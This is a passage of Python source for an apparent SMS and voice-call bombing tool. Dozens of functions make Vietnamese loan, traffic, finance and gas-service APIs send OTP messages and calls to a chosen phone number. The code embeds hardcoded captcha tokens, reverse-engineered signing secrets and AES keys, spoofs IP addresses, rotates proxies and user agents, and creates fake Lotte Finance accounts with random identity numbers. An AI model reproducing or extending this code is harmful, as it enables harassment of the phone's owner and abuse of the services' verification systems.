        print(f"[GhiNhanh-H5] ERR {type(e).__name__}: {e}")
        return False


async def Call_GhiNhanh(phone):
    BASE = "https://api.ghinhanh.com"
    appcheck_tok = _load_appcheck_token("ghinhanh")
    h1 = {
        "Content-Type": "application/json", "lang": "vi_VN",
        "Accept": "*/*", "User-Agent": "IOS",
        "Accept-Language": "vi_VN", "platform": "h5", "app-version": "1.0.2",
    }

    def _ghinhanh_yr(obj):
        if obj is None:
            return obj
        if isinstance(obj, list):
            return [_ghinhanh_yr(x) for x in obj]
        if isinstance(obj, dict):
            return {k: _ghinhanh_yr(obj[k]) for k in sorted(obj.keys())}
        return obj

    try:
        async with _make_client(timeout=15, ) as client:
            rs = await client.get(
                f"{BASE}/api/user/app/common/secret",
                params={"appCode": "ghinhanh", "mobileType": "2", "version": "1.0.2"},
                headers=h1,
            )
            d1 = rs.json() if rs.status_code == 200 else {}
            secret = (d1.get("data") or {}).get("verifySignSecret", "")
            jsessionid = rs.cookies.get("JSESSIONID", "")
            if not jsessionid:
                import re as _re
                m = _re.search(r"JSESSIONID=([^;]+)", rs.headers.get("set-cookie", ""))
                if m:
                    jsessionid = m.group(1)
            if not secret:
                return False
            body = {"appCode": "ghinhanh", "mobileType": "2", "phone": phone, "version": "1.0.2"}
            app_md5 = hashlib.md5(b"ghinhanh").hexdigest()
            ts = int(time.time() * 1000)
            body_sorted = json.dumps(_ghinhanh_yr(body), separators=(",", ":"))
            sign = hashlib.md5(f"{app_md5}*|*{secret}*|*{body_sorted}*|*{ts}".encode()).hexdigest().lower()
            post_headers = {**h1, "timestamp": str(ts), "sign": sign, "Cookie": f"JSESSIONID={jsessionid}"}
            if appcheck_tok:
                post_headers["X-Firebase-AppCheck"] = appcheck_tok
            r2 = await client.post(
                f"{BASE}/api/user/app/login/sms", headers=post_headers, json=body,
            )
        return r2.status_code == 200
    except Exception as e:
        print(f"[GhiNhanh] ERR {type(e).__name__}: {e}")
        return False


async def Call_TuiTien(phone):
    try:
        ts = str(int(time.time() * 1000))
        sign_raw = hashlib.md5(f"{phone}{ts}".encode()).hexdigest()
        headers = {
            "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "vi_VN", "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "IOS", "lang": "vi_VN",
            "timestamp": ts, "sign": sign_raw, "Connection": "keep-alive",
        }
        body = {
            "appCode": "tuitien", "phone": phone, "version": "1.0.1",
            "phoneMark": str(uuid.uuid4()).upper(), "mobileType": 1, "smsType": 1,
        }
        async with _make_client(timeout=20) as client:
            r = await client.post(
                "https://api.tui-tien.com/api/user/app/login/sms",
                headers=headers, json=body,
            )
        try:
            d = r.json()
            ok = d.get("code") == 200 or d.get("data") is True
        except Exception:
            ok = r.status_code == 200
        return ok
    except Exception as e:
        print(f"[TuiTien] ERR {type(e).__name__}: {e}")
        return False




_GT365_CAPTCHA_REGISTER = (
"0cAFcWeA6KvqgvwmqDjRDrsCw2Ed6J-bSM07WFSMgmS0VWuVIcB7UR1FIX7hjNGiFel8p8_Gtj9Aun3jWAS38JjdIv6lPKvDdSh4eL7pFo-Toj37kpDawfx9bjeAa8Q82EY85tjnMPEFYM-Zu0N4K-BHwlRrnVkJxgQujlIzdBkXBdmDLq3Czv86oFxOis_FQLlyH-PhEMpt8_e2d-sVffK0nWFSg_4ZFxFEJYjOVGvERKP3SjwhIuJWDr3Kd8-Qr9KgbDPmKt-HSA6xUk7WvXao8PU2dSFOrwnlWyRVVngbFdTfunbYZbv-_KIK0ki1apcf0UCpMAqQ5YmkGDw2a5tnGkqrgpeGx11a8oRF3hTidaVH4EKsjESb3vq3leBW67WHNj2WiX-Mclkaav344qVljy0qKNTQiGASRMD88IcRITzAsnw2LTnpnPsOHmpRn3DvSyiwAX5t_J6AZ4_7veiIEMFIC3ySws7or82zavm_-K8xCFXpQCfDxQQaipd1m6wDF76N3P9q6qeBZGz757krPxwLtKB2-KR7OFMRCk650a3got1UinE0B_eSHuGVMyvS-SDkCFPNFebAgE1C9ABHyC1FhBaMM05mRt4pjrGqb_xKJSoseVOTZl_96aPBXlJa3iBFIO2DRU-2yWGUtDBS1gPCfEd5l2R_-tLdLuQOAYntCg7SOtHNHmdO_Y8HNiCee8FDnW23FQ3fPwNs-1B8Nr_FjGOL5XB7UdwLiEH325los83Rs-VWXTgZU7aKT10Ax9o_-gdyDhpOAM6T19TKwJdTLtBm5pSVhIggg8YBByfREWsDpWnZ5sLe_S8_8KU9Z8lFH_RyR1D1VU0GeZ39O6JfGaeXZcOm4O4g3sxmtR2odl1EOu7Ynp6gI5YD-arRP3olcZad74nuwGUnDDC6HCFseWymzsRfSCdTLuGiCUc0hItATVTO9tpc9vH1_VeAv_wxI5YgHgd9-FHxqYPFJkP0aHCzHD4ALXNVPgb9w5Jz7UVQAuAPGDgvZIYQAmN-HqX1GJoBPYMieuTtn-XC7LUKWEZz5oI5J8NvEgTOysxtZVo0XNKWt1KL9Ydi0pn_f3Tn4eR1DRRESYxFOAJdGXE2OTpWCU_Xugr1ZHnZMc1IGUKnlPFWmQ28hQUB6H4bYFrCAYdqvWHy4ZhSDwhjHGl8zcKzStq1qfPYIKmY-7BmSfvGsmsOB4aZJ2Ce_JmWFPLtjzW31m0sGuZEaMlG7XcmZnlIF-D0MXyxG1C_MFnPLC9QtORwgvQQZInHluaYpqEMSt6MJinVpCRBH_kIvAlyh7QZcNRClLmWFYxyeaYhB9c3jVJK7R2ZQOqLRGVs-3tyVKT6tGe2YXs9JbXvbYdEG1hChOre5CFvmplDUOzDoH3jUwOZhbM0Kfw6UO2yfonNXymQmL2I9Yrg484dcum-UQPHtH2_QJvSlXYjJ2prYNTAeTMpSKONjXTSQN80kDhmWu2H0q0KtpSeivdfzHTaeG3vUqBQuYF3SP4_l2QTYolTFebNbMv3I8y4b6DCYKWANxLeOku0ZOdbGO8_GTnWzGva1B3vcNiUa5x6xEnxMil1RFhZGtcP-0OzljNP0FZjELso5NVP0arjgHiEH7r_GtyYjDiFyqU_L0so0gCEHSB-WMoPHqXJN7lLXoOYnA7QWm6p05Cmios5tiFxCOmZlkCgI4oz3WxVXWMCFS0sJH-IilLsHAGUzZzQaH6HeQn-hIUclaNwYG3HejWRnlNFoTB0eSZpuxZUz34XWnwDkti_P3uqUFt1lV0eZcqL5OYQY872lXPfgKuHY_Yg-XpX6AxuWlVuzznghnPB_RVGwuZjLBpszgjy0LX7g25agHNrvcbZ3HHCush2HZHgZQbycnIVHAx5uZfz5QvDiD63DfesPQmk-2eVfLBFm8jcetgzgsJiGe1u3W38fgLIjR4YSuSNyJPnpJOcZoXExuo2VXSyWOlYknqeo0oe1zZo2tBtb9sC1OCug8yjUwhWr9QfdBkvmIvfRS_H4IhPLx8dlqrpCkDMnLsg_T6sCV3TS2raNgqLe3zhcXs16rUFGuFcv7B14BaW3SNbTP8qpzfW0rT1c94S3g1jyfJLUvIs2XS_iyuKtvHEJp6dfDoZQ5xKeUABV0-DVz-f6OiKydluijqfwDcOTOudjhrPOVzGzrvZsqihlXzPQFXPNIoLwUgkL7K4gF8I3saZB6FEpZO4GJowHcjZ71Ju1ObZnvX12JUnG9J2ycNwnAmRxk_Em9bcLOyX7HA_lHopUT7CzVoeXo8FozyibJ1uYwnaF2cVdx-iPPbgTzAjDSwpfhLSTtzYkIv_39o110weebbIOAH9sNug3Wv3NFnoBB6Pqr6aEwgOQU8dpVN5Jiv6S9RSKqOb_Ew0Z61fc9JQS1tWTzyOdgI4VALQWkrGY8sr_LGjVIvfzSH5ch8D0s_S4c-XSS9SazvJ6dFvQ7dee_BKDWFoVxpoS8W9RGwDPLWI3fmskwlYVKBvPAhIFvSd0xua9kNJ2XySTBmNfqEYRiuX0nroNtwt9mBgwmLdw0vczWaTO0yyHCAbDzLAYTE147rhZJF-su0gkOzSHfNEsKm64mRlJ7R-wz8xGBwWLZSXyJohXbw1DPVwJkyzp8OQK1KjVuEFnA2TtQIfZTAqEjB38z1Sb88mTCc874mhiLY8sEVrP3nJCxd7cmTRwjO9dg6u-biaPsi1gNgyPpGRJ1yoJYS9zSBvzdEzjHrdrO-PkaX7LTa2tX33qt"
)

_GT365_CAPTCHA_FORGOT = (
"0cAFcWeA7HbgNWL64pt7uCafmYIBYdc9NZkWHktC8sXddTqJpvYw82yjpEwUjPuXHrYCigLU6KS-KiAPYxDdU36TEwP984_gOFk7RaWhHS6PS_ca_y83sumrvIyIDhAoD64Oh-QgtSmHHSjPNxoNE5-6N5zC-ewNlxn-qPoykxywCQEsthymZNfOwC16knHp16XxZP3sAREhl9r0oF50MG4vn6-U6AxE_49qE3wISYBP6MyaiJurYfrV9ZT8PowP34CdjPD79vfjGBVyfcOQAqwp7yVgHabyW-ldNdMafSn-QHC-7DXI7rOoD7V4GWhhVEnK197Ztk2GsYEbPcbyT6csA7oHmY3gdi13luYLWMgRnOeGmOuuxNpI73R5UOJreXc0MWqpekXa_gkUIbyV_6vNgKPo4Cp-6JHdEyg1d3hWF8iBbfWUXoiOmMrqdc8NVCnk1OOu6gYo6fLrAgD3QHow518nUuq6Vq1oxhIi9aJFvaDqju3zG2wILoYZ5iCI5D4sRg9iBfMF2WGLaXywuaT5zhFwkCSMITLflrK-ASIBhiyJsgV4oNWaoUFwX2i0BWhAl5UARfcIzY3Bg4B7i4cHbex689wPcXiI1do3ftqBx3jV9axq-8FGVm0lNkVa3YAAy4BTg5p2Nk-eR5LwPqBkLiwKk29t36nlo9_kyzueGexWQeK0oatsek-wxNbZbiVA1KMqUbJ2HwM7nyVxwGwv8FcXvEizsT0dI3cTKOoTUk66kcnbQ5L9TB_-xJMqmRRALrGzLTumMFjtlFyw5ZSP8ZSaxPAGgcrMpkW-Css3rTcQ0E3BaqB-HBYp6hwTIcQ-Vxb7GrTC3oo9tBPtTzco9vwV5YYm2famtq1A9Y6gKB95nyvAt-7Sugpk8igw1qdwwJ20Sz3F_B6JhojtAGH9JdUZNw_CL0g8gYmJwCHcCQvCDEF3yvezdb2_-D781AcOr8O_zSTzeXMfdpupFS99UZlRmxzSd9l9Cb0YUKbVS5ktbhsdkw6WsR0cZyDV_ZYfv9hDE7VCl-1LoT2rEBFRIoeBjosYNAT5Of71BW6Fbi2s9m3niNuW1DgVscdPulXPh988GjFo5CTwtsbvwL9d053_d2GMNH1CeN18Z-yQyqAW78RlyV3CCJB3V7oKjzmuRvF7z-pE81cyxRGSbw0qUfbF6vaj9axbgUGY6znvQOQFHP5j9zrTW22kHZv7ZNNOwFbqtX7NWLtBqFPw1uozAamB6EeyNbWm5oFiTkhJi9Q7FuhZubXA7IosFnxN_6qe5HqVUyAYyda5OtxGLRVuzNxk6Zzw5nc4u12jTwuL76XnFO70F8mFfk4wCPNwum3iDHIhPaK9tC4p6B39nHgfkCSLOdkFSGY55ZRcVkl1gFMt7ayh9fdDTKgg7McQK5-_eUoVPfxXIRKwMAcVQy0-OI3sdGTviLuNCZPdcWlLFVoroEluKnH3_af7h0LLNv2AjTAtlEXdNiJajxaXWK22MfBdY6Z4O_XTGRSPbdRW_dgU2lWnUsPiF-_SexNPJO7hLyBrYcKsHAuXbdNk26BM2HNY6Pkv-KVfVO54NjIVZAW1Bo-ylxDFiVPooM6R4lAUIDDyIDhcnMFqbDTcdEPaN6NeOL5UpXkAutPD08LL1b-ByhnY346E_8Z6e0J8ZeMsXQ3ZAHmvtzO2zN6oyRHbeQ4X0jnCK89pa4KBoEJUE_C_HikLXPmjh72KL-lYLqbIZ918mQGyGvz8vniYURTjf5UCkhm2x5CzSqwGMVagW8eXgCe1uYAcgh1F2RBCD_vj9QTo_DZKxA3RIn7PoNcaH_bErAZ7aQ-uW4VXKp12tlFBTRx5RObFCrE-BAG6V3HQybPDxuhcpfSrW0hxRt3unao1zu0bOXFBhQcvnwpDewm4RInrEmFIKR86i7M_rEvXF4pfimreHGaunJDJyxfQke0jiqm0_9wYZCYslJ9e7ysnAY3a0673jfZZw5k87WE33GTZsqVbh8WQuxbMU4OEkW3lKJQYipm0QwDkc2qTnzEH9f2vCd93rf1HvrDTEKiP3VTk-6QJz0Vhcsc_Hbh42AKof6kVdyQuStJfzL8BtrqzQ4o4k2AjsWwRjjVsXInWBFMT1GhGXa4hgje7HKfLdwmh8xnM-X4Fjvcjd1iDZRIa4KyzyiGmytWSLb8K97mFWZ7jQVTi2FTO92TKkmb2izn1vXoe2ismTKvJL5AXpi8FqzhM72w3ju37WcD4TcolWvEJYBjpLqbClIkLftsiSOVAQmD7r9Z01NlJRoF-mFCN0Y4P8ZpklCELq30KNWvn8uNobnkYezm1G_IWpgnHHjCIOmjtcdWwE1BbkwY1CpIDZOgacaYQyDTZ9iV1QzZrCFySWVE8EwLZx5ONVsZAVjeuBWPEvPscEQCZOFR4a3CbzRMQBQ6m64ZSYJkXMa2MQ2xr5J9PkgAA1sdlBDK-I7Pl4nl20lJRp2Qb2TmspwoN7f5A1RYh0IgsOGV-rvfHkYgijFTaHX4v-AT63tKPGTxnT6oiTklIHgnZfkdXfAfvXKMabnq79uz_3uVrv_JE8S0B9W6wme"
)


def _gt365_headers(device_id):
    return {
        'Accept': 'application/json,text/plain,text/html',
        'X-Client-Model': 'iPhone 12 Pro',
        'X-Client-Version': '18.1',
        'X-Client-OS': 'iOS',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/json',
        'User-Agent': 'Trafic365/1 CFNetwork/1568.200.51 Darwin/24.1.0',
        'X-Device-Id': device_id,
        'X-App-Version': '2.0.3',
    }


async def giaothong365_register(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    device_id = str(uuid.uuid4()).upper()
    try:
        async with _make_client(timeout=15, follow_redirects=True) as client:
            await client.get(
                'https://api-v2.giaothong365.vn/app/config/api/v1.0/p/all?platform=ios',
                headers=_gt365_headers(device_id),
            )
            resp = await client.put(
                'https://api-v2.giaothong365.vn/openid/api/v1.0/account/p/register/request-otp',
                headers=_gt365_headers(device_id),
                json={'phoneNumber': phone_fmt, 'captchaToken': _GT365_CAPTCHA_REGISTER},
            )
            data = resp.json().get('data', {})
            ok = resp.status_code in (200, 201) or data.get('errorCode') == 400001000
            print(f"GT365-Register | {'OK' if ok else 'X'} [{resp.status_code}]")
            return ok
    except Exception:
        print("GT365-Register | ~> Li")


async def giaothong365_forgot(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    device_id = str(uuid.uuid4()).upper()
    try:
        async with _make_client(timeout=15, follow_redirects=True) as client:
            await client.get(
                'https://api-v2.giaothong365.vn/app/config/api/v1.0/p/all?platform=ios',
                headers=_gt365_headers(device_id),
            )
            resp = await client.put(
                'https://api-v2.giaothong365.vn/openid/api/v1.0/account/p/forgot-password/request-otp',
                headers=_gt365_headers(device_id),
                json={'phoneNumber': phone_fmt, 'captchaToken': _GT365_CAPTCHA_FORGOT},
            )
            ok = resp.status_code in (200, 201)
            print(f"GT365-Forgot | {'OK' if ok else 'X'} [{resp.status_code}]")
            return ok
    except Exception:
        print("GT365-Forgot | ~> Li")


def _vnadmin_sign(data: dict, secret: str) -> str:
    sorted_obj = {k: data[k] for k in sorted(data.keys())}
    step1 = hashlib.md5(json.dumps(sorted_obj, separators=(",", ":")).encode()).hexdigest()
    step2 = hashlib.md5((step1 + secret).encode()).hexdigest().upper()
    return step2[::-1]


async def _vnadmin_request(phone, appkey, origin, url, secret):
    mob = "84" + phone.lstrip("0") if not phone.startswith("84") else phone
    data = {"mobilenumber": mob, "AppKey": appkey, "loading": True}
    data["sign"] = _vnadmin_sign(data, secret)
    try:
        async with _make_client(timeout=30) as client:
            r = await client.post(
                url, json=data,
                headers={
                    "Accept": "*/*", "Content-Type": "application/json",
                    "Origin": origin, "Referer": origin + "/",
                    "lang": "vi_VN",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
                    "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty", "Accept-Language": "vi-VN,vi;q=0.9",
                    "Priority": "u=3, i", "Accept-Encoding": "gzip, deflate, br",
                },
            )
        return r.status_code == 200
    except Exception as e:
        print(f"[vnadmin/{appkey}] ERR {type(e).__name__}: {e}")
        return False


async def vnadmin_1(phone):
    return await _vnadmin_request(
        phone, "App1749282714",
        "https://internal.vnadmin.top",
        "https://api3.vnadmin.top/login/getSmsCode",
        "A2D2E55EB0A02888",
    )


async def vnadmin_2(phone):
    return await _vnadmin_request(
        phone, "App1715327022",
        "https://luckyv2.vnadmin.top",
        "https://api.vnadmin.top/login/getSmsCode",
        "A2D2E55EB0A02666",
    )


async def vnadmin_3(phone):
    return await _vnadmin_request(
        phone, "App1715922397",
        "https://moneytreev2.vnadmin.top",
        "https://api2.vnadmin.top/login/getSmsCode",
        "A2D2E55EB0A02777",
    )



async def vaygo(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://api.vaygovn.com/v1/login/send/msm"
    headers = {
        "Host": "api.vaygovn.com", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://api.vaygovn.com",
        "Referer": "https://api.vaygovn.com/",
        "User-Agent": random.choice(_XMH_UA_POOL),
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f" Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f" Unexpected Error: {e}")
        return False


async def anvay(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://vnapi.anvay.asia/v1/login/send/msm"
    headers = {
        "Host": "vnapi.anvay.asia", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://vnapi.anvay.asia",
        "Referer": "https://vnapi.anvay.asia/",
        "User-Agent": random.choice(_XMH_UA_POOL),
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f" Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"")
        return False


async def vaysuoi(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://api.vaysuoi.com/v1/login/send/msm"
    headers = {
        "Host": "api.vaysuoi.com", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://vaysuoi.com",
        "User-Agent": random.choice(_XMH_UA_POOL),
        "Referer": "https://vaysuoi.com/pages/v1/register/",
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f" Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"{e}")
        return False


async def hicash(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://api.hicash.fun/v1/login/send/msm"
    headers = {
        "Host": "api.hicash.fun", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://h5.hicash.fun",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.hicash.fun/",
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f" Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"{e}")
        return False

async def vayxanh(phone):
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "referer": "https://vayxanh.com/",
    }
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=utf-8",
        "origin": "https://lk.vayxanh.com",
        "referer": f"https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "x-request-id": str(uuid.uuid4()),
    }
    cookies = {}
    try:
        async with httpx.AsyncClient(timeout=30, proxy=_current_proxy()) as cl:
            resp_get = await cl.get(
                "https://lk.vayxanh.com/",
                params={
                    "phone": phone, "amount": "2000000", "term": "7",
                    "utm_source": "direct_vayxanh", "utm_medium": "organic",
                    "utm_campaign": "direct_vayxanh", "utm_content": "mainpage_submit",
                },
                headers=headers_get, cookies=cookies,
            )
            cookies.update(dict(resp_get.cookies))
            r = await cl.post(
                "https://lk.vayxanh.com/internal/client/otp/send",
                cookies=cookies, headers=headers_post,
                json={"data": {"phone": phone, "code": "resend", "channel": "ivr"}},
            )
        return r.status_code == 200
    except Exception as e:
        print(f"[VayXanh] ERR {type(e).__name__}: {e}")
        return False


async def lotte(phone):
    identity = (
        f"0310"
        f"{random.randint(0, 99):02d}"
        f"0"
        f"{random.randint(0, 99):02d}"
        f"1"
        f"{random.randint(0, 99):02d}"
    )
    headers = {
        'Host': 'digital.lottefinance.vn/vi',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'User-Agent': random.choice(_XMH_UA_POOL),
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    try:
        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
            # Step 1: register account
            r1 = await client.post(
                'https://digital.lottefinance.vn/lfd-api/api/account/register',
                headers=headers,
                json={
                    'login': identity, 'phoneNumber': phone,
                    'identityNumber': identity, 'changeRequired': True,
                    'email': 'cotenhp29999@gmail.com',
                },
            )
            d1 = r1.json()
            if d1.get('code') != 'SUCCESS':
                print(f"LOTTEFINANCE | register -> {d1.get('code')} {d1.get('msg', '')}")
                return False
            # Step 2: generate OTP -> SMS to phone
            r2 = await client.post(
                'https://digital.lottefinance.vn/lfd-api/api/auth/otp/generate',
                headers=headers,
                json={'phoneNumber': phone, 'identityNumber': identity},
            )
            d2 = r2.json()
            ok = d2.get('code') == 'OTP.00'
            print(f"LOTTEFINANCE | OTP [{r2.status_code}] code={d2.get('code')} authSeq={d2.get('authSeq')}")
            return ok
    except Exception as e:
        print(f"LOTTEFINANCE | ERR {type(e).__name__}: {e}")
        return False


#  Smart-Loan group: F668 / VayDay / VayFast 
_SMARTLOAN_UA = (
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
)


async def _smartloan_otp(phone: str, base: str, channel: str) -> bool:
    """GET /smart-loan/app/validation/code  dng chung cho F668/VayDay/VayFast."""
    try:
        async with _make_client(timeout=20) as client:
            r = await client.get(
                f"{base}/smart-loan/app/validation/code",
                params={"phone": phone, "type": "MODIFY_PASSWORD", "sendChannel": "IVR"},
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "User-Agent": _SMARTLOAN_UA,
                    "source": "H5",
                    "inputChannel": channel,
                    "versionId": "20230627",
                },
            )
        data = r.json()
        return data.get("status", {}).get("code") == "000"
    except Exception as e:
        print(f"[{channel}] ERR {type(e).__name__}: {e}")
        return False


async def Call_F668(phone: str) -> bool:
    return await _smartloan_otp(phone, "https://f668.vn", "F668")


async def Call_VayDay(phone: str) -> bool:
    return await _smartloan_otp(phone, "https://vayday.vn", "VAYDAY")


async def Call_VayFast(phone: str) -> bool:
    return await _smartloan_otp(phone, "https://vayfast.com.vn", "VAYFAST")


def _load_turnstile_token(app_id: str) -> str:
    import pathlib as _pl
    p = _pl.Path(__file__).parent / "tokens.json"
    if not p.exists():
        print(f"[tokens.json]  Khng tm thy {p}  chy grab-jwt trc")
        return ""
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
        for app in data.get("apps", []):
            if app.get("id") == app_id:
                tok = app.get("turnstileToken") or ""
                if not tok:
                    print(f"[tokens.json]   [{app_id}] turnstileToken chy grab-jwt trc")
                return tok
        print(f"[tokens.json]   Khng tm thy app_id='{app_id}' trong {p}")
        return ""
    except Exception as e:
        print(f"[tokens.json]  Li c {p}: {e}")
        return ""



#  LuckyLoan (AES-ECB) 
_LL_KEY = b"0776640cb64849c8b8dea379551cb922"


def _ll_enc(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":"))
    ct  = AES.new(_LL_KEY, AES.MODE_ECB).encrypt(pad(raw.encode(), 16))
    return base64.b64encode(ct).decode()


def _ll_dec(b64_str):
    try:
        ct    = base64.b64decode(b64_str.strip().strip('"'))
        plain = unpad(AES.new(_LL_KEY, AES.MODE_ECB).decrypt(ct), 16)
        return json.loads(plain.decode())
    except Exception:
        return None


async def Call_LuckyLoan(phone):
    body = _ll_enc({"phone": phone, "type": "login"})
    hdrs = {
        "country": "VN", "Time-Zone": "VNM", "Accept-Language": "vi-VN",
        "X-Tenant-ID": "10000000", "appId": "80000002", "appName": "LuckyLoan",
        "Content-Type": "application/json", "User-Agent": "okhttp/4.12.0",
    }
    try:
        async with _make_client(timeout=12) as c:
            r = await c.post(
                "https://ll.wpvi.cc/luckyloan/api/v1/user/getVerificationCode",
                content=body.encode(), headers=hdrs,
            )
        print(f"[LuckyLoan] {r.text[:200]}")
        try:
            plain = r.json()
            if isinstance(plain, dict):
                return plain.get("code") == 200 or plain.get("successful") is True
        except Exception:
            pass
        resp = _ll_dec(r.text)
        if resp:
            return resp.get("code") == 200 or resp.get("successful") is True
        return r.status_code == 200
    except Exception as e:
        print(f"[LuckyLoan] ERR {type(e).__name__}: {e}")
        return False


#  KetVang (AES-CBC) 
_KV_APP_CODE = "7r0h567tq0u98a23v837gm18074y0i0w"
_KV_KEY      = b"om1ayp5evqZTkQdH"
_KV_IV       = b"\x00" * 16


def _kv_enc(text: str) -> str:
    ct = AES.new(_KV_KEY, AES.MODE_CBC, _KV_IV).encrypt(pad(text.encode(), 16))
    return base64.b64encode(ct).decode()


def _kv_dec(b64):
    try:
        ct    = base64.b64decode(b64)
        plain = unpad(AES.new(_KV_KEY, AES.MODE_CBC, _KV_IV).decrypt(ct), 16)
        return json.loads(plain.decode())
    except Exception:
        return None


async def Call_KetVang(phone):
    mobile    = phone.lstrip("0")
    device_id = str(uuid.uuid4())
    enc_data  = _kv_enc(mobile)
    hdrs = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json", "Cache-Control": "no-cache",
        "APPLICATIONCODE": _KV_APP_CODE, "VERSIONCODE": "2178",
        "DEVICEID": device_id, "EFLAG": "true", "User-Agent": "okhttp/4.12.0",
    }
    try:
        async with _make_client(timeout=12) as c:
            r = await c.post(
                f"https://web.ketvang.net/api/user/login/otp?phone={mobile}&type=2",
                json={"encryptData": enc_data}, headers=hdrs,
            )
        print(f"[KetVang] {r.text[:200]}")
        raw      = r.json()
        enc_resp = raw.get("encryptData", "")
        resp     = _kv_dec(enc_resp) if enc_resp else raw
        if isinstance(resp, dict):
            return resp.get("code") in (200, "200", 0, "0")
        return r.status_code == 200
    except Exception as e:
        print(f"[KetVang] ERR {type(e).__name__}: {e}")
        return False


#  SPJ / GAS24H 
# generateOTP   voice call (code 5335, "ang gi ti ST...")  token lun rng nhng call tht vn 
# forgotPassword  SMS OTP  tr token/record tht
# Gi c 2  va c voice call va c SMS
_SPJ_BASE = "https://spj.daukhimiennam.com"
_SPJ_UA   = "G24H/260528 CFNetwork/1568.200.51 Darwin/24.1.0"


def _spj_q(phone: str, extra: dict | None = None) -> bytes:
    import secrets as _sec
    payload = {
        "app_type": 3, "version_code": "260528", "platform": "ios",
        "token": _sec.token_hex(16), "acc": phone, "device_imei": str(uuid.uuid4()).upper(),
        "app_customer_type": 1, "role_id": "", "soft_version": 1,
        "phone": phone, "username": phone,
        "gcm_device_token": "aeab06653a92fbaaeb9f55739b09d0534b3d15d77973676fa276e8fad8fd6017",
        "device_name": "iPhone", "device_os_version": "18.1",
        "request_timestamp": int(time.time() * 1000),
        "request_key": uuid.uuid4().hex[:16],
    }
    if extra:
        payload.update(extra)
    return json.dumps(payload, separators=(",", ":")).encode()


async def Call_SPJ(phone):
    hdrs = {"User-Agent": _SPJ_UA, "Accept": "application/json, text/plain, */*",
            "Accept-Language": "vi-VN,vi;q=0.9"}
    ok = False
    try:
        async with _make_client(timeout=15, follow_redirects=True, proxy=_current_proxy()) as c:
            await c.get(_SPJ_BASE + "/", headers={"User-Agent": _SPJ_UA})

            # 1) Voice call  generateOTP lun tr token="" nhng call vn tht
            r1 = await c.post(
                _SPJ_BASE + "/api/customer/generateOTP",
